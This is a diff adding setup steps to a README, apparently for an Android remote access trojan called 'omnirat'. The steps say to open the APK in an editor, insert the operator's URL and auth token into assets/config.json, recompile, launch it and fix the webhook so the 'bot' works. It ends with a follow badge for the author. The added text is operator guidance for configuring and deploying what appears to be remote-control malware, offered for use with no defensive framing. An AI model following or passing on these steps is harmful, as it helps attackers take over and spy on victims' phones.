@@ -90,3 +90,18 @@ keep your url safe together with your auth token, youll need it later.
     <img src="https://img.shields.io/badge/Download%20App-100000?style=for-the-badge&logo=android&logoColor=white" alt="Download Apk editor pro" />
   </a>
 </p>
+
+open the apk editor, and open the omnirat with it.
+locate assets folder and edit the `config.json`
+
+inside the config.json add your url and auth_token 
+save your work and compile the app. launch it once and youre done.
+
+> dont forget to fix your webhook ese your bot wont work.
+
+give me a follow on my main account
+<p align="left">
+  <a href="https://github.com/Resonex">
+    <img src="https://img.shields.io/badge/Follow%20@Resonex-100000?style=for-the-badge&logo=github&logoColor=white" alt="Follow Resonex on GitHub" />
+  </a>
+</p>
